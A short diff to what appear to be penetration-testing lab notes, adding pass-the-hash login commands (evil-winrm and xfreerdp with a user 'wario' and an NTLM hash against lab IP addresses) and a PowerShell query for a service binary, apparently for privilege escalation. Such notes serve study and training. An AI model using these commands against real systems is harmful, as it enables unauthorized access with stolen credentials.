@@ -42,19 +42,21 @@ Select-Object Name, Length, LastWriteTime
 ```
 
 ```
-
+ evil-winrm -i 172.16.162.83 -u 'wario' -H fdf36048c1cf88f5630381c5e38feb8e
 ```
 
 ```
-
+xfreerdp3 /u:wario /pth:'fdf36048c1cf88f5630381c5e38feb8e' /v:172.16.162.12
 ```
 
 ```
-
+xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:medtech.com\\wario /pth:'fdf36048c1cf88f5630381c5e38feb8e' /v:172.16.162.12
 ```
 
 ```
-
+Get-CimInstance Win32_Service |
+Where-Object {$_.PathName -match "backup1\.exe"} |
+Select-Object Name, DisplayName, State, StartMode, StartName, PathName
 ```
 
 ```
